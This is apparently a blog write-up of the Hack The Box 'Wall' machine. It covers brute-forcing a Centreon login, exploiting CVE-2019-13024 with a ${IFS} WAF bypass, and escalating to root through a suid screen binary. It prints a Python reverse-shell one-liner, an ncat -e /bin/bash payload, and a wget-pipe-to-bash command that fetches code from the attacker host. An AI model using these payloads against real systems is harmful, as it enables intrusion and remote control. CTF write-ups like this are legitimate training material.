<h1>Introduction</h1>
<p>

</p>

<p>Wall was an easy Linux machine from HTB that focused on <code>RCE</code>/<code>WAF</code> bypass to establish an initial foothold then a direct pivot to root using a vulnerable <code>suid</code> binary. Let's follow along with my walkthrough. </p>

<h1>Initial Recon</h1>

<p>Per usual I start off with enumerating the machine using NMAP.</p>

<p>The web service index page only showed a default Apache page. Ran <code>dirb</code> a few times to see if we could enumerate anything further.</p>

</p>

<p>The <code>monitoring</code> was protected by basic auth. This seemed like an interesting avenue, however no amount of brute forcing was successful. After a bit of struggling tried changing the request from a <code>GET</code> to a <code>POST</code> and it worked! Managed to capture a redirect through <code>Burp</code> to a <code>/centreon</code> page.</p>

</p>

<p>Alright, so we have a product, and we have a version. A quick lookup at <a href="https://documentation.centreon.com/docs/centreon/en/19.04/installation/from_VM.html">Centreon documentation</a> tells us that the default credentials are <code>admin/centreon</code>. Unfortunately this wasn't the case - looks like someone did their due diligence and changed the default password! A little bit more research and managed to find that this version of <code>Centreon</code> should be vulnerable to <a href="https://www.cvedetails.com/cve/CVE-2019-13024/">CVE-2019-13024</a>. Based on the writeup and code <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">here</a> I used a stripped down version of the code to bruteforce the password by looking for the <code>csrf</code> token being returned by the exploit. The payload portion was commented out for this phase.</p>

{% highlight shell %}

{% endhighlight %}

<p>Excellent, we now have the proper credentials <code>admin/password1</code>. CVE-2019-13024 indicates the vulnerability is in <code>/main.get.php?p=60901</code>. Setting up a listener and executing the exploit with payload enabled unfortunately did not work. Looking further at the exploit code payload to attempt and understand more what is happening.</p>

{% highlight shell %}
# this value contains the payload , you can change it as you want
"nagios_bin": "ncat -e /bin/bash {0} {1} #".format(ip, port),
{% endhighlight %}

<p>I played around with different payloads and I was able to deduce that there was a <code>WAF</code> in place and interfering with the payload. With a little bit of trial and error the main thing I could figure out was that <code>spaces</code> were culprit. This was determined by modifying the exploit code to print out the result code of the <code>POST</code> request to <code>/main.get.php?p=60901</code> - a 403 return would indicate the payload was being detected by the <code>WAF</code>.</p>

<p>

</p>

<p>Unfortunately, I was not able to get the exploit working through the script. I decided to tackle the exploit manually through the webpage. Logging in as <code>admin/password1</code> then navigating to <code>/main.get.php?p=60901</code> we can that the nagios_bin portion of the exploit translates to the "Monitoring Engine Binary". I tested a few different payloads without success however finally I was able to get a call to my machine to download and execute a payload.<p>

{% highlight shell %}
root@kali:/var/www/html# cat pyrev.txt
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.116",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
{% endhighlight %}

<p>With the following payload I was finally able to get a reverse shell established.</p>

{% highlight shell %}
wget${IFS}-qO-${IFS}http://10.10.14.116/pyrev.txt${IFS}|${IFS}bash;
{% endhighlight %}

<h1>Root exploitation</h1>

<p>Unfortunately I was not able to retrieve the user flag as <code>www-data</code>. Popped over an enumeration script and started looking for pivot avenues. One particularly interesting result was <code>screen-4.5.0</code> which had suid set.</p>

{% highlight shell %}

<p>I poked around a bit to see if there were any low-hanging fruit for this privesc and sure enough managed to find a searchsploit exploit.</p>

<p>Moved the script over to Wall and kicked it off to see if we can successfully privesc to root.</p>

<p>
<img src="{{ '/assets/htb-wall/root-initialshell.PNG' | relative_url }}">
</p>

<p>And with that we had access to our root.txt flag and could easily step to the user.txt flag as well.</p>

<h1>Extra fun</h1>

<p>Unfortunately as a result of the privesc exploit there were a lot of remnants left on the machine. As a final act made sure to clean up after myself not to ruin anyone else's experience that happened to stumble upon these.</p>
